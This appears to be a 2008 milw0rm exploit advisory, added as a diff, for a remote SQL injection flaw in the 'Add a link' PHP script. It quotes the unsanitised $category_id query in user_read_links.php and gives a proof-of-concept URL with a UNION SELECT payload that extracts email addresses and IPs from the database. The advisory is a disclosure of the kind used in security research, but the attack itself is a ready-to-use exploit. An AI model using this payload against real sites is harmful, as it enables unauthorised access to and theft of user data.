@@ -1,0 +1,42 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Add a link <= 4 - beta || Remote SQL Injection Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+/ Script: Add a link
+/ Version: <= 4 - beta
+/ File affected: user_read_links.php
+/ Download: http://sourceforge.net/projects/addalink/
+/ need magic_quotes_gpc = Off
+
+
+Found by ka0x <ka0x01 [at] gmail [dot] com>
+D.O.M Labs - Security Researchers
+- www.domlabs.org
+
+
+Vuln Code:
+--------------
+
+32:  $read_out_linktable="SELECT * FROM $linktable WHERE approved='1' AND category_id='$category_id' ORDER BY id DESC LIMIT $start,$steps";
+33:  $read_result=mysql_query($read_out_linktable);
+
+....
+
+87:  while($data=mysql_fetch_array($read_result))
+88:  {
+90:      echo "<tr><td colspan=\"5\">$data[description]</td></tr>";
+91:  }
+
+--------------
+
+The var $category_id isn't verified.
+
+
+Proof of Concept:
+
+http://[host]/[addalink-path]/user_read_links.php?category_id=' UNION SELECT 1,1,1,1,1,1,concat(email,0x3a,ip),1,1,1,1 FROM Linklisttable/*
+
+
+__EOF__
+
+# milw0rm.com [2008-09-18]
